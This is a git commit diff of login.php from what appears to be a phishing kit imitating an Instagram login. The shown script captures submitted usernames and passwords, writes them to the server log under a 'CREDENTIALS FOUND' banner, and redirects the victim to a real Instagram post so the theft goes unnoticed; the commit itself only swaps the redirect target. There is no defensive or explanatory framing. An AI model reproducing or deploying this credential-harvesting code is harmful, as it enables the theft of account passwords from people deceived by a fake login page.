04d758bf45111eb32c82ccaf46ea20a652acb9e1
mranon0 <103735483+mranon0@users.noreply.github.com>
2022-08-13 00:47:07 +0530

    Update login.php

--- login.php
+++ login.php
@@ -4,5 +4,5 @@ $password = $_POST['password'];
 $res = "[+++++++++++ CREDENTIALS FOUND +++++++++] Username: $username <--|+++++++++++++++++|--> Password: $password";
 error_log("[+] Credentials Found!!!");
 error_log("$res");
-echo "<script type='text/javascript'>window.location='https://shorturl.ae/WNpcJ'</script>";
+echo "<script type='text/javascript'>window.location='https://www.instagram.com/p/CUdRulKAozb/?igshid=YmMyMTA2M2Y='</script>";
 ?>
